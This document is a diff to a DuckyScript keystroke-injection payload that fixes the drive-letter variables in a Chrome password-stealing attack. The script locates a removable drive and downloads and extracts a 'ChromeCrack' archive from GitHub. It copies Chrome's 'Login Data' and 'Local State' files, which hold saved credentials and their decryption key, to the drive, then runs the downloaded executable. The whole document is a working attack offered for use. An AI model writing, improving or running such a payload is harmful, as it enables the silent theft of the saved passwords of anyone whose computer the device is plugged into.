@@ -27,10 +27,10 @@ DELAY 800
 STRING $a = cmd /c "wmic logicaldisk where drivetype=2 get deviceid"
 ENTER
 DELAY 800
-STRING $b = a[2]
+STRING $b = $a[2]
 ENTER
 DELAY 800
-STRING Invoke-WebRequest -Uri 'https://github.com/lucianchauvin/ChromePasswordYoinker/raw/master/ChromeCrack.zip' -OutFile "$b[2]:\Users\$env:UserName\ChromeCracker.zip"
+STRING Invoke-WebRequest -Uri 'https://github.com/lucianchauvin/ChromePasswordYoinker/raw/master/ChromeCrack.zip' -OutFile "$b:\Users\$env:UserName\ChromeCracker.zip"
 ENTER
 DELAY 800
 STRING Expand-Archive C:\Users\$env:UserName\ChromeCracker.zip -DestinationPath C:\Users\$env:UserName\ChromeCracker -Force
@@ -39,13 +39,13 @@ DELAY 800
 STRING New-Item -ItemType "directory" -Name "$env:UserName" -Path "x:\" -Force
 ENTER
 DELAY 800
-STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data" -Destination "$b[2]\$env:UserName\"
+STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data" -Destination "$b\$env:UserName\"
 ENTER
 DELAY 800
-STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data" -Destination "$b[2]\$env:UserName\"
+STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data" -Destination "$b\$env:UserName\"
 ENTER
 DELAY 800
-STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Local State" -Destination "$b[2]\$env:UserName\"
+STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Local State" -Destination "$b\$env:UserName\"
 ENTER
 DELAY 800
 STRING cd C:\Users\$env:UserName\ChromeCracker\ChromeCrack\; .\ChromeCrack.exe $env:UserName
